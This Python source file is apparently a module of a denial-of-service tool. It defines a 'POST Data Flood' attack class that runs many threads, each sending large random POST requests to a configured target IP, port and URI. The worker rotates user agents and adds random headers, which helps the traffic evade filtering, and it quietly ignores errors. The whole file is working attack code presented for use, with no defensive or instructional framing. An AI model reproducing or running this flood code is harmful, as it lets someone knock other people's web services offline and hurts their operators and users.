"""
POST Data Flood attack module
"""

import http.client
import time
import threading
import random
import string
from config.settings import USER_AGENTS
from utils.helpers import get_random_headers

class POSTFlood:
    def __init__(self, target_config, config_manager, stats_manager):
        self.target_ip = target_config["ip"]
        self.target_port = target_config["port"]
        self.target_uri = target_config["uri"]
        self.config_manager = config_manager
        self.stats_manager = stats_manager
        self.is_running = False
        self.threads = []
    
    def start(self):
        """Start POST flood attack"""
        self.is_running = True
        config = self.config_manager.get_attack_config("post_flood")
        
        for _ in range(config["threads"]):
            thread = threading.Thread(target=self._attack_worker, daemon=True)
            thread.start()
            self.threads.append(thread)
    
    def stop(self):
        """Stop POST flood attack"""
        self.is_running = False
        
        for thread in self.threads:
            thread.join(timeout=2)
    
    def _attack_worker(self):
        """POST flood worker thread"""
        config = self.config_manager.get_attack_config("post_flood")
        
        while self.is_running:
            try:
                conn = http.client.HTTPConnection(self.target_ip, self.target_port, timeout=3)
                
                # Generate large POST data
                post_data = ''.join(random.choices(
                    string.ascii_letters + string.digits + ' ', 
                    k=config["data_size"]
                ))
                
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": str(len(post_data)),
                    "Connection": "close"
                }
                
                # Add random headers
                headers.update(get_random_headers(1, 3))
                
                # Send POST request
                conn.request(
                    "POST", 
                    f"{self.target_uri}?post_attack={random.randint(1000,9999)}", 
                    body=post_data, 
                    headers=headers
                )
                response = conn.getresponse()
                response.read()
                conn.close()

                self.stats_manager.increment_post_requests()
                
            except Exception:
                pass
            
            time.sleep(0.01)